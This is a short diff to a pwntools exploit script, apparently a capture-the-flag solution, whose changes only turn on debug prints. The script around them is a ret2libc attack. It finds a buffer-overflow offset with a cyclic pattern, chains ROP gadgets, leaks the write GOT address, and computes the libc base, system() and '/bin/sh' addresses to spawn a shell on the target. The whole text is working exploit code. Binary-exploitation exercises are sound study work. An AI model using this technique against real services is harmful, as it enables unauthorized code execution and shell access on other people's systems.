@@ -286,6 +286,8 @@ paddingBytes = find_ip(cyclic(1024))
 sh = start()
 pop_rdi = 0x4012cb
 pop_rsi_r15 = 0x4012c9  
+info("%#x pop_rdi", pop_rdi) # format this into hex
+info("%#x pop_rsi_r15", pop_rsi_r15) # format this into hex
 
 payload = flat(
     {paddingBytes: [
@@ -302,16 +304,16 @@ sh.sendlineafter('>>', payload)
 sh.recvuntil('May your wish come true!\n') 
 leaked_addr = sh.recv() # got the address printed out in hex
 got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
-#info("leaked got_write: %#x", got_write)
+info("leaked got_write: %#x", got_write)
 
-libc_base = got_write - 0xf8180
-#info("libc_base: %#x", libc_base)
+libc_base = got_write - 0xf8180 
+info("libc_base: %#x", libc_base)
 
 system_addr = libc_base + 0x4c330
-#info("system_addr: %#x", system_addr)
+info("system_addr: %#x", system_addr)
 
 bin_sh = libc_base + 0x196031
-#info("bin_sh: %#x", bin_sh)
+info("bin_sh: %#x", bin_sh)
 
 payload = flat(
     {paddingBytes: [
